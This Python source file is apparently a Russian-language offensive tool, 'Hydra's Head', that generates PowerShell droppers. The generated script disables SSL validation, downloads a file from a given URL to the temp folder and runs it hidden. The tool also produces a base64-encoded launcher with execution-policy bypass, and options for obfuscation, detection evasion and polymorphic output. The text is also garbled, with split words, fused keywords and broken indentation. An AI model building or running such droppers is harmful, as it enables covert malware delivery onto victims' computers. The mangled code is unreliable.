







import os



import sys



import argparse



import bas e64











sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))







from core.managerimport PayloadManager



from core.configimport load_config







defbanner():



    pr in t("""
    ╦ ╦╦ ╦╔╦╗╦═╗╔═╗╔═╗  ╦ ╦╔═╗╔═╗╔╦╗ - POWERSHELL DROPPER
    ╠═╣╚╦╝ ║║╠╦╝╠═╣╚═╗  ╠═╣║╣ ╠═╣ ║║
    ╩ ╩ ╩ ═╩╝╩╚═╩ ╩╚═╝  ╩ ╩╚═╝╩ ╩═╩╝
    Генератор дроппера PowerShell с возможностью загрузки и выполнения
    """)







defencode_powershell_command(powershell_command):







command_bytes=powershell_command.encode('utf-16le')



bas e64_command=bas e64.b64encode(command_bytes).decode('as cii')



return bas e64_command







defcreate_download_execute_ps(url,filename=None,execute=True):







if notfilename:



        filename=os.path.bas ename(url)







temp_dir="$env:TEMP"



target_path=f"{temp_dir}\\{filename}"







ps_command=f"""
# Отключаем проверку SSL сертификатов
[System.Net.ServicePo in tManager]::ServerCertif icateValidationCallback = {{$true}};

# Загрузка файла
try {{
    $webclient = New-Object System.Net.WebClient;
    $webclient.Headers.Add("User-Agent", "Mozilla/5.0 (W in dows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36");
    $webclient.DownloadFile("{url}", "{target_path}");
    Write-Host "File downloaded successfully to {target_path}";
"""







if execute:



        ps_command+=f"""
    # Выполнение загруженного файла
    Start-Process -FilePath "{target_path}" -W in dowStyle Hidden;
    Write-Host "File execution initiated";
"""







ps_command+="""
} catch {
    Write-Host "An error occurred: $_";
}
"""



return ps_command







defcreate_launcher_command(ps_script,hide=True):







encoded_command=encode_powershell_command(ps_script)







if hide:



        launcher=f"powershell.exe -NoP -NonI -W Hidden -Exec Bypas s -EncodedCommand {encoded_command}"



else:



        launcher=f"powershell.exe -NoP -NonI -Exec Bypas s -EncodedCommand {encoded_command}"







return launcher







defparse_arguments():



    parser=argparse.ArgumentParser(description="Hydra's Head PowerShell Dropper Generator")







parser.add_argument("--url",required=True,help="URL для загрузки файла")



parser.add_argument("--filename",help="Имя сохраняемого файла (по умолчанию: имя из URL)")



parser.add_argument("--no-execute",action="store_true",help="Не выполнять загруженный файл")



parser.add_argument("--output","-o",required=True,help="Имя выходного файла")



parser.add_argument("--obfuscation",choices=["low","medium","high","max"],



default="medium",help="Уровень обфускации")



parser.add_argument("--type","-t",choices=["exe","ps1"],



default="exe",help="Тип выходного файла")



parser.add_argument("--evas ion",action="store_true",help="Добавить техники обхода обнаружения")



parser.add_argument("--iterations","-i",type=int,default=1,help="Количество итераций обфускации")



parser.add_argument("--visible",action="store_true",help="Показывать окно PowerShell")







return parser.parse_args()







defmain():



    banner()



args=parse_arguments()







try:







        ps_script=create_download_execute_ps(



url=args.url,



filename=args.filename,



execute=notargs.no_execute



)











launcher_command=create_launcher_command(ps_script,hide=notargs.visible)







pr in t(f"[+] URL для загрузки: {args.url}")



pr in t(f"[+] Будет ли выполнен: {'Нет' if args.no_execute else 'Да'}")



pr in t(f"[+] Тип нагрузки: {args.type}")



pr in t(f"[+] Уровень обфускации: {args.obfuscation}")











config=load_config()



manager=PayloadManager(config)







pr in t("\n[+] Генерация полиморфного дроппера PowerShell...")







if args.type=="ps1":







            payload=ps_script



else:







            payload=launcher_command











manager.generate(



payload_type=args.type,



payload=payload,



output_path=args.output,



obfuscation_level=args.obfuscation,



use_evas ion=args.evas ion,



iterations=args.iterations



)







pr in t(f"[+] Дроппер успешно сгенерирован: {args.output}")







if args.type=="ps1":



            pr in t("[!] Для запуска PS1 файла можно использовать команду:")



pr in t(f"    powershell.exe -ExecutionPolicy Bypas s -File {args.output}")







except Exceptionas e:



        pr in t(f"[-] Ошибка при создании дроппера: {str(e)}")



return1







return0







if__name__=="__main__":



    sys.exit(main())